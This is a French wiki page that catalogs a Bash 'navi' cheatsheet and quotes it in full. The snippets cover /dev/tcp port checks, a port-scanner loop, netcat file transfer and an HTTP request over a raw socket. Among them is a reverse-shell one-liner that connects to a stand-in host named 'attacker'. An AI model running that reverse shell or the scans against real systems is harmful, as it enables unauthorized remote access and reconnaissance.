---
nom: bash.cheat
description: Cheatsheet navi de commandes Bash — sockets, scanners, transferts, reverse shells, kubectl, redirection /dev/tcp
type: source
date_creation: 2026-05-25
date_modification: 2026-05-25
version: 1.0.0
tags:
  - bash
  - shell
  - terminal
  - cheat-sheet
  - navi
  - socket
  - /dev/tcp
sources: []
---

# Source : bash.cheat

> Cheatsheet navi original de pushou, catégorisé `category:shell`.

## Description

Fichier de cheatsheet navi contenant des snippets Bash couvrant : redirection via `/dev/tcp`, scanners de ports, transferts de fichiers, reverse shells, requêtes HTTP, et interaction avec Kubernetes.

## Métadonnées

| Champ | Valeur |
|-------|--------|
| Fichier | `sources/bash.cheat` |
| Auteur | pushou |
| Tags | `bash, shell, terminal, category:shell` |
| Sections | 8 |
| Type | Cheatsheet navi |

## Pages wiki alimentées

- [[entites/bash.md]] — Page d'entité Bash
- [[concepts/dev-tcp.md]] — Concept de redirection /dev/tcp

## Contenu brut

```
% bash,shell,terminal,category:shell,pushou

# comment bash
<< COMMENT1
 this is a COMMENT1
 bla..
COMMENT1


# bash socket
timeout 0.5 echo -n 2>/dev/null < /dev/tcp/127.0.0.1/7777 && echo "open" || echo "closed"

# bash k8s
kubectl exec -it svc/random-service -- bash
$ echo < /dev/tcp/other-service.namespace.svc.cluster.local/7777 && echo "open" || echo "closed"

# bash scanner
for port in {1..8888}; do
  echo -n 2>/dev/null < /dev/tcp/127.0.0.1/$port && echo "$port/tcp open"
done

# read the time
cat < /dev/tcp/time.nist.gov/13

# file transfer
nc -lvnp 7777 < file.txt
cat < /dev/tcp/sender/7777 > file.txt
cat file.txt > /dev/tcp/receiver/7777

# bash reverse shell
nc -lvnp 7777
bash -c 'bash -i >& /dev/tcp/attacker/7777 0>&1'

# bash nc scan
sudo nc -zvw 1 localhost 1-1000|grep -v failed

# bash http request
exec 5<>/dev/tcp/www.google.com/80
echo -e "GET / HTTP/1.1\r\nhost: www.google.com\r\nConnection: close\r\n\r\n" >&5
cat <&5

# ps
ps -faux

# pgrep list process name
sudo pgrep -u tpot -l
sudo pkill -HUP  -u tpot Suricata-Main

$ IP_VERSION: echo '4 6' | tr ' ' '\n'
```
